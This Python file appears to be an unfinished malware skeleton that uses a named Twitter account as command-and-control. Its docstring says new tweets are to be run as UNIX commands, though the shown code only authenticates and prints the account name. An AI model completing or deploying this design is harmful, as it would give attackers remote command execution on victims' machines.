#!/usr/bin/python3
# TODO do we need all these import statements?
from tweepy import OAuthHandler
from tweepy import API
from tweepy import Cursor
from datetime import datetime, date, time, timedelta
from collections import Counter
import sys

# TODO keys, tokens, etc.
CONSUMER_KEY = ''
CONSUMER_SECRET = ''
ACCESS_TOKEN = ''
ACCESS_TOKEN_SECRET = ''

# The static account to which the malware connects.
# TODO actually create this twitter account.
STATIC_C2_ACCOUNT = 'Sulla09366348'


def main():
    """Runs the program."""
    print('Hello world')
    auth_api = get_twitter_api_auth()
    run_tweets(auth_api)


def get_twitter_api_auth():
    """Returns the authorized API object used to access tweets."""
    auth = OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET)
    auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)
    return API(auth)


def run_tweets(auth_api):
    """Navigates to the static Twitter account and waits for activity.
    New tweets are run as UNIX commands."""
    user = auth_api.get_user(STATIC_C2_ACCOUNT)
    print("Account name: " + user.name)


if __name__ == '__main__':
    main()

